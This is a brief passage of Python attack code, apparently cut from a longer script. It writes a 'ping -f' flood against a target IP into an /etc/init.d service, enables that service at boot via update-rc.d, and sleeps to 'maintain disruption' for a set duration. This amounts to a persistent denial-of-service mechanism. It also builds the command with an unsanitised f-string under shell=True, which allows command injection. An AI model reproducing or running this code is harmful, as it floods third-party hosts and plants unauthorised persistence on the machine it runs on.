        service_command = f"echo 'ping -f {target_ip}' > /etc/init.d/{service_name} && chmod +x /etc/init.d/{service_name} && update-rc.d {service_name} defaults"
        subprocess.run(service_command, shell=True)

    # Maintain disruption for the specified duration
    time.sleep(duration)
